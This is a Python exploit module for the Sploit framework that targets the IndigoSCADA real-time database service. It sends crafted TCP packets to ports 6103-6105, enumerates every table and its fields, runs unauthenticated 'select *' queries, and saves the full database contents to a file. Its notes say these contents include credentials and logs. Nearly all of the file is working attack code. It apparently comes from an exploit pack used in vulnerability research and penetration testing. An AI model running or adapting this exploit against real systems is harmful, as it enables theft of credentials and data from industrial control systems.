#!/usr/bin/env python

import socket
import struct
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_indigo_scada_information_disclosure"
INFO['DESCRIPTION'] = "Indigo Scada Real-time database service db content disclosure"
INFO['VENDOR'] = "http://www.enscada.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    Specially crafted TCP package to Real-time database service on ports 6103, 6104, 6105 disclosures arbitrary content of DB(include creds, logs, etc).
Tested against "IndigoSCADA Version: Aug 7 2014, Real time database version: 354" on Windows 7 SP1 x64.
"""
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "5 May, 2016. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.222"
OPTIONS["PORT"] = 6103
OPTIONS["SAVE DUMP AS"] = "IndigoScada_dump.txt"


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.ports_map = {}
        self.socket = None

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("SAVE DUMP AS", OPTIONS["SAVE DUMP AS"])
        self.content = []

    def get_db_tables(self):
        data = "\x00\x00\x00\x0c\x00\x00\x00\x10\x00\x00\x00\x00"
        self.socket.sendall(data)
        tables = self.socket.recv(4096)[8:].split('\x00')
        tables = [table for table in tables if table]
        return tables

    def get_table_fields(self, table):
        data = "\x00\x00\x00\x12"
        data += "\x00\x00\x00\x0f\x00\x00\x00\x00" + table + "\x00"
        data = struct.pack(">I", len(data)) + data[4:]
        self.socket.sendall(data)
        recvd_string = self.socket.recv(4096)
        ret = {}
        fields = recvd_string[8:].split("\x00\x00\x00")
        for field in fields:
            field = field.strip(" ")
            if not field:
                continue
            ret[field[2:]] = field[0]
        return ret

    def execute_sql(self, table, fields={}):
        self.log("#####################################################################")
        self.content.append("#####################################################################")
        req = "select * from " + table
        data = "\x00\x00\x00\x00"  # length
        data += "\x00\x00\x00\x01"
        data += "\x00\x00\x00\x0f"
        data += struct.pack(">H", len(fields))
        data += struct.pack(">H", len(req) + 1)
        data += req
        fields_list = []
        for field in fields:
            fields_list.append(field)
            data += "\x00" + fields[field] + field
        fields = " | ".join(fields_list)
        self.log("Table {}:".format(table))
        self.log(fields)
        self.content.append("Table {}:".format(table))
        self.content.append(fields)
        data += "\x00\x00"
        data = struct.pack(">I", len(data)) + data[4:]
        self.socket.sendall(data)
        hcount = self.socket.recv(1024)
        if hcount == '\xff\xff\xff\xf1':
            self.log("Error in DB")
            return
        count = abs(struct.unpack(">i", hcount)[0])

        data = "\x00\x00\x00\x0c\x00\x00\x00\x05\x00\x00\x00\x0f"
        for i in xrange(count):
            self.socket.sendall(data)
            parser = FastDBParser(self.socket.recv(4096))
            self.log(" | ".join(str(value) for value in parser.values))
            self.content.append(" | ".join(str(value) for value in parser.values))

    def run(self):
        # Get options from gui
        self.args()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        tables = self.get_db_tables()
        for table in tables:
            fields = self.get_table_fields(table)
            self.execute_sql(table, fields)
        self.writefile("\r\n".join(self.content), self.filename)
        self.finish(True)


class FastDBParser:
    def __init__(self, buffer):
        self.buffer = buffer[8:]
        self.values = []
        self.run()

    def read_int4(self):
        current_val = self.buffer[0:4]
        self.buffer = self.buffer[4:]
        ret = struct.unpack(">i", current_val)[0]
        self.values.append(ret)

    def read_int8(self):
        current_val = self.buffer[0:8]
        self.buffer = self.buffer[8:]
        ret = struct.unpack(">q", current_val)[0]
        self.values.append(ret)

    def read_string(self):
        current_val = self.buffer[0:4]
        self.buffer = self.buffer[4:]
        length = struct.unpack(">I", current_val)[0]
        word = self.buffer[:(length - 1)]
        self.buffer = self.buffer[length:]
        self.values.append(word)

    def run(self):
        while len(self.buffer) > 0:
            vartype = self.buffer[:1]
            self.buffer = self.buffer[1:]
            if vartype == "\x04":
                self.read_int4()
            elif vartype == "\x05":
                self.read_int8()
            elif vartype == "\x09":
                self.read_string()


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
